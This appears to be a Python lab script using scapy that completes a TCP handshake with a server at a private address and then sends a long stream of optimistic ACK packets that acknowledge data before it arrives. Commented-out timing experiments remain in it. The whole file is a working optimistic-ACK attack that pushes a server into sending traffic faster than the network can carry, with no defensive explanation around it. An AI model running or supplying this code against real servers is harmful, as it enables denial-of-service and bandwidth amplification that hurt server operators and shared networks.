#!/usr/bin/env python


import time
from scapy.all import *


server_port = 8000
attacker_port = 6666
server_ip = "10.0.2.4"


# Choose a random sequence number
sequence_number = 100


# Construct a SYN packet.
print "Sending SYN..."
syn_packet = IP(dst=server_ip) / TCP(sport=attacker_port, dport=server_port, flags='S', seq=sequence_number)
print "Syn sent"
syn_packet.show()


# Construct a SYN-ACK packet.
print "Sending SYN-ACK..."
synack_packet = sr1(syn_packet)
print "Syn ack received"
synack_packet.show()


# Construct an ACK packet.
ack_packet = IP(dst=server_ip) / TCP(sport=attacker_port, dport=server_port, flags='A', ack=synack_packet.seq + 1, seq=(sequence_number + 1))


print "Sending ACK..."
#time0 = time.time()
first_data_packet = sr1(ack_packet)
#time1 = time.time()
#RTT = time1-time0
#print "Round Trip time for the ack and the data packet in seconds : ", RTT
print "Ack packet sent and data received"
first_data_packet.show()

print "First data packet arrived. Sending optimistic acks."

sequence_to_acknowledge = first_data_packet.seq
payload_size = len(first_data_packet.payload.payload)
#payload_size = 5000
#payload_size = 5300

#j = 1

for i in range(1, int(10000000 / payload_size)):
	
	optimistic_ack_packet = IP(dst=server_ip) / TCP(sport=attacker_port, dport=server_port, flags='A', ack=(sequence_to_acknowledge + i * payload_size), seq=(sequence_number + 1))
	send(optimistic_ack_packet)
	#data = sr1(optimistic_ack_packet)
	#sequence_to_acknowledge = data.seq + len(data)
	#if RTT/2 - 0.01 * i > 0 :
		#time.sleep(RTT/2 - 0.01*i)
	"""
	send(optimistic_ack_packet)
	if i > 10 :
		if RTT - j * 0.01 > 0:
			time.sleep(RTT - j * 0.01)
			j += 0.1
	"""
	


	
